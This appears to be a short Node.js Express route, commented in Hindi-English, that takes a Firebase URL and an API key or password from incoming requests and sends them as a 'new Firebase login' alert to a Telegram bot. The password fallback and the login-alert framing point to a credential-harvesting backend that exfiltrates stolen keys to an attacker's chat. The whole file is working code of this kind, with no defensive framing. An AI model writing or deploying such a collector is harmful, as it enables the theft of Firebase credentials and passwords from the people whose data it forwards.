app.post('/firebase-connected', async (req, res) => {
    try {
        // Yahan hum check kar rahe hain ki agar URL undefined ya khali hai, toh request ka poora data ya URL print kar de
        const firebaseUrI = req.body.firebaseUrI || req.body.firebaseUrl || req.body.url || req.headers.referer || 'Panel Login';
        const apiKey = req.body.apiKey || req.body.key || req.body.password || 'N/A';

        const message = `🔔 Naya Firebase Login Hua!\n\n🔗 Source/URL: ${firebaseUrI}\n🔑 API Key / Data: ${apiKey}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        const data = await response.json();
        if (data.ok) {
            res.status(200).json({ success: true, message: 'Notification bhej di gayi hai!' });
        } else {
            res.status(500).json({ success: false, error: data.description });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});
